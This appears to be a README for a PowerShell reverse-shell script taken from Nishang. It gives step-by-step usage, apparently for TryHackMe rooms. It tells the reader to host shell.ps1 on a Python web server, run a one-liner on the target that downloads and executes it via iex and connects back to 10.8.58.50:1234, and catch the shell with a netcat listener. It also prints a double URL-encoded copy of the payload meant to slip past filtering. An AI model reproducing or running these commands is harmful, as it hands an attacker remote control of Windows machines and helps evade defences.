# powershell-reverse-shell
its a simple powershell script took from nishang a usefully for reverse shell most for windows, so as i can't get hard time most to get a reverse shell on windows, you can download nishang with the command below
command: **sudo apt install nishang**


# how to run the powershell script and get a reverse shell(usage)
**1.** open a simple python server and make sure the script is right there were you have opened the server
command: python3 -m http.server 81

where: 
port 81 (is where i have decided to open the port coz for me port 80 was already in used)
ip_address: 10.8.58.50 (check via ifconfig command or ip a| grep tun0)

**NB**: After you have saved this script and opened a server now u can execute the following command on the target machine

**2.** there multiple ways to do this first all u need to save the file as saved for me as shell.ps1 and after u need to execute the following command the target machine(anyway vulnerable that can allow you to run command or execute commands

**command**: powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.8.58.50:81/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.58.50 -Port 1234

NB: sometimes this command may not work so u can just incode the command either online or anything i love doing this with burpsuite course it is easy
Forexample with a tryhackme  room(iron corp , in order to get a reverse shell you were supporsed to encode the payload more than two times

## my encoded payload
%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%30%25%32%38%25%34%65%25%36%35%25%37%37%25%32%64%25%34%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%34%65%25%36%35%25%37%34%25%32%65%25%35%37%25%36%35%25%36%32%25%34%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%34%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%35%25%33%38%25%32%65%25%33%35%25%33%30%25%33%61%25%33%38%25%33%31%25%32%66%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%33%62%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%30%25%32%64%25%35%32%25%36%35%25%37%36%25%36%35%25%37%32%25%37%33%25%36%35%25%32%30%25%32%64%25%34%39%25%35%30%25%34%31%25%36%34%25%36%34%25%37%32%25%36%35%25%37%33%25%37%33%25%32%30%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%35%25%33%38%25%32%65%25%33%35%25%33%30%25%32%30%25%32%64%25%35%30%25%36%66%25%37%32%25%37%34%25%32%30%25%33%31%25%33%32%25%33%33%25%33%34


3. start a netcat listener on your local machine

**command:** nc -nlvp 1234

